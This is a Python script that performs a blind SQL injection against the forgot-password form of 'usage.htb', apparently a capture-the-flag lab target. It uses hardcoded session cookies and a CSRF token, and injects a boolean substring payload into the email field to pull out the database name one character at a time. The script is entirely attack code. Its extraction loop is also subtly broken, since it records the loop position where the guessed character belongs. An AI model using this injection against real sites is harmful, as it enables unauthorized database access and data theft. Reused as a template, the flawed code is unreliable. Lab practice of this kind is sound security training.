import httpx, sys

URL = "http://usage.htb"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)
        self.c.cookies = {
            "XSRF-TOKEN": "eyJpdiI6ImdSN0Fxd1pRTWp6QVZTRU5MckZ3Z2c9PSIsInZhbHVlIjoiUytTY2dSMlhFc09pckFxYjREWFhVbFpIMW4vOXNYSW5ZekREUUNrT09zOU9wRGtaWm9vdFR3TXRPWUY3c25FaXpmaTIvT0s3OGVVRWI5c2w4T21tTU5qeW9VTmN3bm9BSW9NR1d0Sklzak9NV1pOK3RJVkdINFhBbFo0OGNXQzAiLCJtYWMiOiJlYjVjYjIzOWYwZWE2OTNmNjdjNDhjNzA3MTcyMTE4MjM0NDYxNmZjYjQ0ODY5NWFhM2U5NGQxMWE0MWU5ZjNkIiwidGFnIjoiIn0%3D",
            "laravel_session": "eyJpdiI6InVKRnQ1STAxOFNwUEVlQ1d6S0NmRnc9PSIsInZhbHVlIjoicStSR0U5MjVuSEZlSEVIejVCUXVZM2FBbGJsTUJCSkZtK0VMUVJQQ29qWCsvY0tJR1NjaFNBOE9pNldUckZwZmdFcE1WNVVad3JhMHlZUjFVeXJ3eEMrZk1hUW1oVVg4OUdlMVZJTlNHWjhERnBPcEpEaVllcVRCVHB1eHZ2MGUiLCJtYWMiOiIzZTU4MmY2Y2E3NmNhMGYxYTJjNDlmYmE2YzM5ODZlODcxNjdiM2YxNWMxZWQ3MWY1NmU4YWYxZDA1ZGVhYzg4IiwidGFnIjoiIn0%3D"
        }
    def forget_pass(self, email) -> bool:
        r = self.c.post('/forget-password', data={
            "_token": "tW1SdfUR3ZLsux9WqGSzUDNAPN3ai2Ok3Ryim0v1",
            "email": email
        }, follow_redirects=True)
        if "We have e-mailed" in r.text:
            return True
        return False

class API(BaseAPI):
    def blindsqli(self):
        extracted_data = ""
        for index in range(1,30):
            for i in range(0x20, 0x7f):
                query = "a' OR BINARY substring(database(), %d, 1) = '%s' -- " % (index, chr(i))
                if self.forget_pass(query):
                    status = True
                    
                else:
                    status = False

                if status == True:
                    extracted_data += chr(index)
                    sys.stdout.write(chr(index))
                    sys.stdout.flush()
                    break
        print("The query result is: {}".format(extracted_data))


if __name__ == "__main__":
    api = API()
    api.blindsqli()
